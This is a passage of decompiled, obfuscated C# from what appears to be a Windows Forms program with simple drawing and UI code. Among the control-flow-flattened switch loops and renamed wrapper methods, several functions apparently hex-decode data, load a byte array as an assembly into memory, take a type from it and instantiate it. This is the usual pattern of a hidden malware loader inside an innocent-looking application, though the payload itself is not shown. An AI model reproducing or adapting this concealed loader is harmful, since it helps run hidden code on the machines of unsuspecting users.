					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)((num2 * 1957794758) ^ 0x75F5B051);
					continue;
				case 14u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					num = (int)((num2 * 782654271) ^ 0x2EFEBECE);
					continue;
				case 12u:
					label5 = Form1.smethod_57();
					num = ((int)num2 * -1275541071) ^ -1619885061;
					continue;
				case 11u:
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -1227283171) ^ -126847875;
					continue;
				case 10u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = ((int)num2 * -32538820) ^ -1554194785;
					continue;
				case 9u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -378613774) ^ 0x1CC1B8CF;
					continue;
				case 8u:
					Form1.smethod_64((Control)(object)label6, 13);
					num = ((int)num2 * -1977716734) ^ -933711444;
					continue;
				case 7u:
					num = ((int)num2 * -761936866) ^ -388070499;
					continue;
				case 6u:
					num = (int)(num2 * 198663549) ^ -1095328495;
					continue;
				case 5u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = ((int)num2 * -61286645) ^ 0x426B05C6;
					continue;
				case 4u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = ((int)num2 * -1299481049) ^ -1888122792;
					continue;
				case 3u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = ((int)num2 * -1899582261) ^ -192147123;
					continue;
				case 2u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = ((int)num2 * -2070200629) ^ -413653677;
					continue;
				case 1u:
					num = ((int)num2 * -589669781) ^ 0x3FFDEF9B;
					continue;
				case 0u:
					Form1.smethod_64((Control)(object)panel1, 7);
					num = ((int)num2 * -1416923434) ^ 0x45C45586;
					continue;
				default:
					return;
				case 95u:
					break;
				case 13u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = default(Assembly);
		while (true)
		{
			int num = -500401320;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xF58985DFu) % 5u)
				{
				case 4u:
					PerformTable(q);
					num = ((int)num2 * -1010770707) ^ 0x2857D80F;
					continue;
				case 2u:
					q = ContextAdd(Level);
					num = (int)((num2 * 1966800707) ^ 0x1573EA8C);
					continue;
				case 1u:
					num = (int)(num2 * 493476650) ^ -707086237;
					continue;
				default:
					return;
				case 0u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = 889062690;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x43F7E84u) % 4u)
				{
				case 2u:
					result = Form1.smethod_94(Form1.smethod_93(), Position);
					num = ((int)num2 * -1560968489) ^ -696640601;
					continue;
				case 1u:
					num = (int)(num2 * 1743722063) ^ -1798151425;
					continue;
				case 3u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		while (true)
		{
			int num = -753721504;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xDE278D4Au) % 3u)
				{
				case 1u:
					goto IL_0003;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
				IL_0003:
				ComMember = Form1.smethod_95(Q3)[24];
				num = (int)(num2 * 489756002) ^ -942770287;
			}
		}
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
